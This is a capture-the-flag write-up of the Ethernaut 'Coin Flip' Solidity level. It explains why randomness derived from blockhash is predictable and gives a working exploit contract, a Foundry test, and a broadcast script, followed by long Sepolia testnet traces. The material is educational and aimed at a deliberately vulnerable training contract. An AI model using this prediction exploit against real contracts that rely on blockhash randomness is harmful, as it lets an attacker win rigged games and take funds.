## 👾 03. Coin Flip



<br>


### tl; dr

<br>


* in this challenge, we exploit the determinism of a pseudo-random function composed uniquely of an EVM global accessible variable (`blockhash`) and no added entropy.

<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/63de48b2-4c5a-4499-b054-7fcd4a2a520d">
</p>



<br>

```solidity
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```


<br>

---

### discussion

<br>


* the EVM is a deterministic turing machine. 
  - since it has no inherent randomness and as everything in the contracts is publicly visible (*e.g.*, `block.timestamp`, `block.number`), generating random numbers in solidity is non-trivial.
  - projects resource to external oracles or to Ethereum validator's **[RANDAO](https://github.com/randao/randao)** algorithm.

<br>

* the `CoinFlip` contract uses the current block's `blockhash` to determine the side of a coin, represented by a `bool` variable named `coinFlip`:

<br>

```solidity
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

<br>

* which is derived from the variable `blockValue` as a `uint256` generated from the previous block number (block's number minus 1):

<br>

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
```

<br>

* this `FACTOR` variable is useless. 
  - first, division by a large constant does not introduce any randomness entropy at all. 
  - second, even if this constant is private, it's still available at etherscan or by decompiling the bytecode (if the contract is not verified).

<br>

```solidity
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

<br>

* the "randomness" in this contract is calculated from on-chain deterministic data, so all we need to do is simulate `side` before we submit a guess, and repeat this ten times.

<br>

```solidity
if (side == _guess) {
    consecutiveWins++;
    return true;
} else {
    consecutiveWins = 0;
    return false;
}
```



<br>

* for this simulation, we leverage **[foundry's `vm.roll(uint256)`](https://book.getfoundry.sh/cheatcodes/roll?highlight=vm.roll#examples)**, which simulates the `block.number` given by the `uint256`.


<br>


----

### solution

<br>


* our exploit is located at `src/03/CoinFlipExploit.sol`:

<br>

```solidity
contract CoinFlipExploit {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastBlockValue;

    function run(CoinFlip level) public {
        uint256 blockNumber = uint256(blockhash(block.number - 1));
        if (blockNumber == lastBlockValue) {
            return;
        }
        uint256 coinFlip = blockNumber / FACTOR;
        bool coinSide = coinFlip == 1 ? true : false;
        level.flip(coinSide);
        lastBlockValue = blockNumber;
    }
}
```

<br>

* which can be tested with `test/03/CoinFlip.t.sol`:

<br>

```solidity
contract CoinFlipTest is Test {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 private immutable FIRST_BLOCK = 137;
    uint8 consecutiveWins = 10;
    address instance = vm.addr(0x1); 
    address hacker = vm.addr(0x2); 
    CoinFlip public level;

    function setUp() public {
        vm.prank(instance);
        level = new CoinFlip();
        assertEq(level.consecutiveWins(), 0);
    }

    function testCoinFlipHack() public {
        vm.startPrank(hacker);
        vm.roll(FIRST_BLOCK);

        CoinFlipExploit exploit = new CoinFlipExploit();
        for (uint256 i = FIRST_BLOCK; i < FIRST_BLOCK + consecutiveWins; i++) {
            vm.roll(i + 1); 
            exploit.run(level);
        }

        assert(level.consecutiveWins() == consecutiveWins);
        vm.stopPrank();
      }
}
```

<br>

* running with:

<br>

```shell
> forge test --match-contract CoinFlipTest -vvvv

Running 1 test for test/03/CoinFlip.t.sol:CoinFlipTest
[PASS] testCoinFlipHack() (gas: 247316)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 670.88µs
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



<br>



* to submit the solution, we run `script/03/CoinFlip.s.sol`:

<br>

```solidity
contract Exploit is Script {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint8 private immutable consecutiveWins = 10;
    address instance = vm.envAddress("INSTANCE_LEVEL3"); 
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    

    function run() public {
        vm.startBroadcast(hacker);

        CoinFlip level = CoinFlip(instance);
        CoinFlipExploit exploit = new CoinFlipExploit();
        
        vm.roll(block.number - consecutiveWins);
        
        for (uint256 i = 1; i < consecutiveWins + 1; i++) {
            uint256 lastBlockNumber = block.number;
            vm.roll(lastBlockNumber + 1);
            exploit.run(level);
        }

        console.log(level.consecutiveWins());

        vm.stopBroadcast();
    }
}
```

<br>

* with:

<br>

```shell
> forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia

[⠰] Compiling...
No files changed, compilation skipped
Traces:
  [232837] Exploit::run() 
    ├─ [0] VM::startBroadcast(0x93Bc9E22Af0d4791E6AA31b4D845F750b32966ad) 
    │   └─ ← ()
    ├─ [98980] → new CoinFlipExploit@0x677cB6C1682E2Fa2715B637190167FAc419a4a88
    │   └─ ← 494 bytes of code
    ├─ [0] VM::roll(4230860 [4.23e6]) 
    │   └─ ← ()
    ├─ [0] VM::roll(4230861 [4.23e6]) 
    │   └─ ← ()
    ├─ [38278] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [12777] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(true) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230862 [4.23e6]) 
    │   └─ ← ()
    ├─ [2278] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1177] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(true) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230863 [4.23e6]) 
    │   └─ ← ()
    ├─ [2278] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1177] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(true) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230864 [4.23e6]) 
    │   └─ ← ()
    ├─ [2298] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1187] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(false) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230865 [4.23e6]) 
    │   └─ ← ()
    ├─ [2278] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1177] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(true) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230866 [4.23e6]) 
    │   └─ ← ()
    ├─ [2298] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1187] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(false) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230867 [4.23e6]) 
    │   └─ ← ()
    ├─ [2278] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1177] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(true) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230868 [4.23e6]) 
    │   └─ ← ()
    ├─ [2298] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1187] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(false) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230869 [4.23e6]) 
    │   └─ ← ()
    ├─ [2298] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1187] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(false) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [0] VM::roll(4230870 [4.23e6]) 
    │   └─ ← ()
    ├─ [2278] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    │   ├─ [1177] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(true) 
    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← ()
    ├─ [295] 0x02855133d00F21A874a9aA27f361d450a38094B7::consecutiveWins() [staticcall]
    │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000011
    ├─ [0] console::f5b1bba9(0000000000000000000000000000000000000000000000000000000000000011) [staticcall]
    │   └─ ← ()
    ├─ [0] VM::stopBroadcast() 
    │   └─ ← ()
    └─ ← ()


Script ran successfully.

== Logs ==
  10

## Setting up (1) EVMs.
==========================
Simulated On-chain Traces:

  [159788] → new CoinFlipExploit@0x677cB6C1682E2Fa2715B637190167FAc419a4a88
    └─ ← 494 bytes of code

  [63441] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    ├─ [12777] 0x02855133d00F21A874a9aA27f361d450a38094B7::flip(true) 
    │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()

  [25402] CoinFlipExploit::run(0x02855133d00F21A874a9aA27f361d450a38094B7) 
    └─ ← ()


==========================

Chain 11155111

Estimated gas price: 3.00000004 gwei

Estimated total gas used for script: 587395

Estimated amount required: 0.0017621850234958 ETH

==========================

##
Waiting for receipts.
⠄ [00:00:13] [#####################################################################################################################################################################################################] 11/11 receipts (0.0s)
##### sepolia
✅  [Success]Hash: 0x974e6b9a856aa81b641d4e1a5b18644b383c92feb6781edb2bd23ef19b0b8a7f
Contract Address: 0x677cB6C1682E2Fa2715B637190167FAc419a4a88
Block: 4230872
Paid: 0.000479472003835776 ETH (159824 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x17c9f360d020099a5d08880ef3b625f081879afcc26d567e14a40b8cb11d7da7
Block: 4230872
Paid: 0.00017919000143352 ETH (59730 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x22a2a7e7ed0cf6732050891991497a94addc542f0a323aa38fe4c912296981dd
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x45c80ae71fb4ac124c123d38b2e29f1f9035454f10df90bd7b324abe4e12e358
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x5763bdb161e3bd552059d0fc93cc4c72af4613726070d7a79a6d7a0fb381bcfa
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x55f2133584d84e8a71b02206d5dd7f3bba3edde37692ce15db862783a73744cd
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x631a34e22d8230895dcc1d5a2df8ae737251e2935e7dda1621a904ae058043cf
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x82ca8d62e0e85f93f8dfdb59062d8a90fa104d8e95190499cf5e0e4acf6624f6
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x2e69355a89b3a913ab22c318d64db563fba932fda1e0f84face60d9a50aa5c4a
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0xbf1387beb5577ee6186556265ff7a629e33eb0fe24e0fa466afde75cca53c3b8
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)


##### sepolia
✅  [Success]Hash: 0x0e9703533d6783c8e9e3bead467cf4ae304d6b01f13f9ba5e4a7d17c5fed944b
Block: 4230872
Paid: 0.000071724000573792 ETH (23908 gas * 3.000000024 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
Total Paid: 0.001304178010433424 ETH (434726 gas * avg 3.000000024 gwei)
```



<br>

----


### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



